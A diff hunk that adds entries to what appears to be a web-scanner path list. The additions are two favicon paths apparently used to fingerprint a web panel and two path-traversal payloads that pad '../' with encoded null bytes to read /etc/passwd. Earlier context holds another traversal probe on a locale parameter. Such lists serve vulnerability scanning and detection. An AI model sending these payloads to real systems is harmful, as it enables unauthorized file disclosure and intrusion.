@@ -92,3 +92,7 @@
 /locales/locale.json?locale=..%2F..%2Fconfig&namespace=app
 /i18n/component/JS?locale=en-US
 /api/v1/version
+/login/cwp_theme/original/img/ico/favicon.ico
+/login/design/img/ico/favicon.ico
+/user/index.php?api=1&scripts=.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./etc/passwd
+/user/login.php?api=1&scripts=.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./.%00%00%00./etc/passwd
